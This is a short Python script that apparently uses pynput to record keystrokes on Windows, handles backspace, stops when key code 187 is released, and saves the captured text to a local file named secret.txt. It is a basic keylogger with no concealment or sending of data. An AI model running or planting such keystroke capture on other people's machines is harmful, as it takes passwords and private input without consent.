from pynput import keyboard

string = ''

def on_press(key):
    global string
    #print(key, type(key))
    if str(type(key)) == "<class 'pynput.keyboard._win32.KeyCode'>" and str(key) != '<187>':
        string += str(key).replace("'", '')
    if key == keyboard.Key.backspace:
        #print(1)
        string = string[:len(string)-1]


def on_release(key):
    if str(key) == '<187>':
        return False

if __name__ == '__main__':
    with keyboard.Listener(
        on_release=on_release,
        on_press=on_press
    ) as listener:
        listener.join()
    with open('secret.txt', 'w') as secret:
        secret.write(string)